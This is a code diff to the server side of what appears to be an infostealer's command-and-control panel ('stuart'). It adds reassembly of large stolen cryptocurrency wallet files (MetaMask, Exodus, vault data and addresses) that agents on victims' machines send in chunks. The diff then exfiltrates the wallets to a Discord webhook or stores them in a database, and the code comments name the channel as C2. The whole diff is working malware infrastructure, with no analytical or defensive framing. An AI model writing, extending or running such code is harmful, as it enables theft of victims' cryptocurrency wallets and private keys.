@@ -339,12 +339,17 @@ const pendingDiscordHarvest = new Map();
  */
 const pendingDiscordWallets = new Map();
 /**
+ * In-flight agent→server chunk reassembly for large wallets (MetaMask etc.).
+ * key = `${clientId}\0${name}` → { meta, chunks: Map, total, size }
+ */
+const pendingWalletChunks = new Map();
+/**
  * Wait for wallet_auto_data before Discord flush.
  * clientId -> { expected: Set<string>, received: Set<string>, done: boolean, maxTimer }
  */
 const pendingWalletExpect = new Map();
 /** Absolute max wait for wallet zips after harvest (ms). */
-const DISCORD_WALLET_MAX_WAIT_MS = 90000;
+const DISCORD_WALLET_MAX_WAIT_MS = 120000;
 let discordPollRunning = false;
 let discordPollStatus = { lastAt: 0, lastOk: null, lastError: "", imported: 0, message: "" };
 
@@ -1005,41 +1010,67 @@ async function postZipsToDiscordWebhook({ webhookUrl, parts, content, threadName
     try { return JSON.parse(text); } catch (_) { return { ok: true }; }
   }
 
+  // Prefer one file at a time for wallet packs (more reliable under 8 MiB guild limits)
+  const oneByOne = useParts.length > 1 || useParts.some(p => p.size > 4 * 1024 * 1024);
+
+  async function uploadSequentially() {
+    let firstMsg = null;
+    let threadId = existingThreadId || null;
+    const errors = [];
+    for (let i = 0; i < useParts.length; i++) {
+      const p = useParts[i];
+      if (p.size > DISCORD_PART_MAX_BYTES) {
+        console.error(
+          `[stuart] SKIP Discord part ${p.filename} (${(p.size / 1024 / 1024).toFixed(2)} MiB > limit) — not aborting siblings`
+        );
+        errors.push(p.filename);
+        continue;
+      }
+      const partContent = useParts.length > 1
+        ? `${content}\n\n_Part **${i + 1}/${useParts.length}**: \`${p.filename}\` (${(p.size / 1024 / 1024).toFixed(2)} MiB)_`
+        : content;
+      try {
+        let msg;
+        if (!threadId) {
+          msg = await postOnce([p], { threadName, content: partContent });
+          threadId = msg?.channel_id || null;
+          firstMsg = msg;
+        } else {
+          msg = await postOnce([p], { threadId, content: partContent });
+          if (!firstMsg) firstMsg = msg;
+          else if (msg?.attachments) {
+            firstMsg.attachments = [...(firstMsg.attachments || []), ...msg.attachments];
+          }
+        }
+        console.log(`[stuart] Discord part ${i + 1}/${useParts.length} ok: ${p.filename}`);
+      } catch (err) {
+        console.error(`[stuart] Discord part FAILED ${p.filename}: ${err.message}`);
+        errors.push(p.filename);
+        // continue other parts (don't lose Exodus because MetaMask failed)
+      }
+    }
+    if (!firstMsg && errors.length === useParts.length) {
+      throw new Error(`All Discord parts failed: ${errors.join(", ")}`);
+    }
+    return firstMsg || { ok: true, channel_id: threadId, partialErrors: errors };
+  }
+
+  if (oneByOne) {
+    try {
+      return await uploadSequentially();
+    } catch (e) {
+      throw e;
+    }
+  }
+
   try {
     return await postOnce(useParts, { threadName, threadId: existingThreadId });
   } catch (e) {
     const tooBig = e.status === 413
       || /payload|too large|entity too large|maximum size|8000000|8388608/i.test(String(e.message) + String(e.body || ""));
-    if (!tooBig || useParts.length === 0) throw e;
-
+    if (!tooBig) throw e;
     console.warn(`[stuart] multi-file Discord upload failed (${e.message}); retrying one part at a time`);
-    let firstMsg = null;
-    let threadId = existingThreadId || null;
-    for (let i = 0; i < useParts.length; i++) {
-      const p = useParts[i];
-      if (p.size > DISCORD_PART_MAX_BYTES) {
-        throw new Error(
-          `Zip part ${p.filename} is ${(p.size / 1024 / 1024).toFixed(2)} MiB; Discord limit ~8 MiB.`
-        );
-      }
-      const partContent = useParts.length > 1
-        ? `${content}\n\n_Part **${i + 1}/${useParts.length}**: \`${p.filename}\`_`
-        : content;
-      let msg;
-      if (!threadId) {
-        msg = await postOnce([p], { threadName, content: partContent });
-        threadId = msg?.channel_id || null;
-        firstMsg = msg;
-      } else {
-        msg = await postOnce([p], { threadId, content: partContent });
-        if (!firstMsg) firstMsg = msg;
-        else if (msg?.attachments) {
-          firstMsg.attachments = [...(firstMsg.attachments || []), ...msg.attachments];
-        }
-      }
-      console.log(`[stuart] Discord part ${i + 1}/${useParts.length} ok: ${p.filename}`);
-    }
-    return firstMsg || { ok: true, channel_id: threadId };
+    return uploadSequentially();
   }
 }
 
@@ -1216,15 +1247,27 @@ function clearWalletExpect(clientId) {
   pendingWalletExpect.delete(clientId);
 }
 
-function bufferDiscordWallet(clientId, payload) {
-  if (!payload?.content) {
-    console.warn(`[stuart] wallet_auto_data missing content name=${payload?.name}`);
-    return false;
-  }
+function pushBufferedWallet(clientId, entry) {
   let list = pendingDiscordWallets.get(clientId);
   if (!list) {
     list = [];
     pendingDiscordWallets.set(clientId, list);
+  }
+  const idx = list.findIndex(w => w.name === entry.name);
+  if (idx >= 0) list[idx] = entry;
+  else list.push(entry);
+  noteWalletReceived(clientId, entry.name);
+  console.log(
+    `[stuart] Discord-buffered wallet "${entry.name}" ${(entry.content.length / 1024 / 1024).toFixed(2)} MiB ` +
+    `(${list.length} buffered, ready=${walletsReadyForFlush(clientId)}) client=${clientId}`
+  );
+  return true;
+}
+
+function bufferDiscordWallet(clientId, payload) {
+  if (!payload?.content) {
+    console.warn(`[stuart] wallet_auto_data missing content name=${payload?.name}`);
+    return false;
   }
   let content;
   try {
@@ -1234,25 +1277,94 @@ function bufferDiscordWallet(clientId, payload) {
     return false;
   }
   if (!content.length) return false;
-  const name = String(payload.name || "wallet");
-  const idx = list.findIndex(w => w.name === name);
-  const entry = {
-    name,
+  return pushBufferedWallet(clientId, {
+    name: String(payload.name || "wallet"),
     type: payload.type || null,
     path: payload.path || "",
     addresses: payload.addresses || [],
     vaultData: payload.vaultData || null,
     size: payload.size || content.length,
     content,
-  };
-  if (idx >= 0) list[idx] = entry;
-  else list.push(entry);
-  noteWalletReceived(clientId, name);
-  console.log(
-    `[stuart] Discord-buffered wallet "${name}" ${(content.length / 1024 / 1024).toFixed(2)} MiB ` +
-    `(${list.length} buffered, ready=${walletsReadyForFlush(clientId)}) client=${clientId}`
-  );
-  return true;
+  });
+}
+
+/** Start / continue reassembly of a large wallet sent as wallet_auto_chunk events. */
+function handleWalletChunkEvent(clientId, event, payload) {
+  const name = payload?.name;
+  if (!name) return;
+  const key = `${clientId}\0${name}`;
+
+  if (event === "wallet_auto_chunk_start") {
+    pendingWalletChunks.set(key, {
+      meta: {
+        name,
+        type: payload.type || null,
+        path: payload.path || "",
+        addresses: payload.addresses || [],
+        vaultData: payload.vaultData || null,
+        size: Number(payload.size) || 0,
+      },
+      total: Number(payload.chunks) || 0,
+      chunks: new Map(),
+    });
+    noteExpectedWallets(clientId, [name]);
+    console.log(`[stuart] wallet chunk transfer start "${name}" chunks=${payload.chunks} size=${payload.size}`);
+    return;
+  }
+
+  if (event === "wallet_auto_chunk") {
+    let acc = pendingWalletChunks.get(key);
+    if (!acc) {
+      acc = {
+        meta: { name, type: null, path: "", addresses: [], vaultData: null, size: 0 },
+        total: Number(payload.chunks) || 0,
+        chunks: new Map(),
+      };
+      pendingWalletChunks.set(key, acc);
+    }
+    try {
+      const buf = Buffer.from(payload.content || "", "base64");
+      acc.chunks.set(Number(payload.chunk) || 1, buf);
+      console.log(
+        `[stuart] wallet chunk ${payload.chunk}/${payload.chunks || acc.total} "${name}" +${buf.length} bytes`
+      );
+    } catch (e) {
+      console.warn(`[stuart] wallet chunk decode failed ${name}:`, e.message);
+    }
+    return;
+  }
+
+  if (event === "wallet_auto_chunk_end") {
+    const acc = pendingWalletChunks.get(key);
+    pendingWalletChunks.delete(key);
+    if (!acc) {
+      console.warn(`[stuart] wallet_auto_chunk_end without start: ${name}`);
+      noteWalletSkipped(clientId, name);
+      return;
+    }
+    const total = Number(payload.chunks) || acc.total || acc.chunks.size;
+    const ordered = [];
+    for (let i = 1; i <= total; i++) {
+      const c = acc.chunks.get(i);
+      if (!c) {
+        console.warn(`[stuart] incomplete wallet chunks for "${name}": missing ${i}/${total}`);
+        noteWalletSkipped(clientId, name);
+        return;
+      }
+      ordered.push(c);
+    }
+    const content = Buffer.concat(ordered);
+    console.log(`[stuart] reassembled agent wallet "${name}" ${(content.length / 1024 / 1024).toFixed(2)} MiB from ${total} chunks`);
+    pushBufferedWallet(clientId, {
+      name,
+      type: acc.meta.type,
+      path: acc.meta.path,
+      addresses: acc.meta.addresses,
+      vaultData: acc.meta.vaultData,
+      size: content.length,
+      content,
+    });
+  }
 }
 
 function safeWalletFileName(name, index) {
@@ -2799,6 +2911,42 @@ export default {
         console.log(`[stuart] wallet_auto_skip ${payload?.name}: ${payload?.reason || ""}`);
         if (walletsReadyForFlush(clientId)) scheduleDiscordFinalize(clientId);
       }
+    } else if (event === "wallet_auto_chunk_start" || event === "wallet_auto_chunk" || event === "wallet_auto_chunk_end") {
+      // Large wallets (MetaMask ~9MB) arrive as chunks so the C2 event channel doesn't drop them
+      if (isDiscordPipelineOn()) {
+        handleWalletChunkEvent(clientId, event, payload || {});
+        if (event === "wallet_auto_chunk_end") {
+          if (payload?.name) {
+            bufferDiscordHarvest(clientId, {
+              wallets: [{ name: payload.name, type: null, path: "", files: 0, size: payload.size || 0 }],
+            }, { replace: false });
+          }
+          scheduleDiscordFinalize(clientId);
+          try { ctx.broadcast("discord_upload_pending", { clientId, wallets: true }); } catch (_) {}
+        }
+        return;
+      }
+      // Pipeline off: still reassemble then write C2
+      handleWalletChunkEvent(clientId, event, payload || {});
+      if (event === "wallet_auto_chunk_end") {
+        const list = pendingDiscordWallets.get(clientId) || [];
+        const w = list.find(x => x.name === payload?.name);
+        if (w) {
+          let bp = null;
+          if (blobDir) {
+            bp = walletBlobPath(clientId, w.name);
+            if (!writeBlob(bp, w.content)) bp = null;
+          }
+          ctx.db.prepare(`INSERT OR REPLACE INTO wallet_data(client_id,name,path,type,addresses,vault_data,content,blob_path,size,captured_at) VALUES(?,?,?,?,?,?,?,?,?,?)`)
+            .run(clientId, w.name, w.path || "", w.type || null,
+              JSON.stringify(w.addresses || []), w.vaultData || null,
+              bp ? null : w.content, bp, w.content.length, now);
+          // remove from discord buffer (not using pipeline)
+          pendingDiscordWallets.set(clientId, list.filter(x => x.name !== w.name));
+          noteWalletReceived(clientId, w.name);
+          ctx.broadcast("wallet_data_update", { clientId, name: w.name });
+        }
+      }
     } else if (event === "wallet_auto_done") {
       if (isDiscordPipelineOn()) {
         noteWalletsDone(clientId);
@@ -2823,11 +2971,7 @@ export default {
             }],
           }, { replace: false });
         }
-        if (ok && walletsReadyForFlush(clientId)) {
-          scheduleDiscordFinalize(clientId);
-        } else {
-          scheduleDiscordFinalize(clientId); // keep settle alive while more wallets arrive
-        }
+        scheduleDiscordFinalize(clientId);
         try { ctx.broadcast("discord_upload_pending", { clientId, wallets: true }); } catch (_) {}
         return;
       }
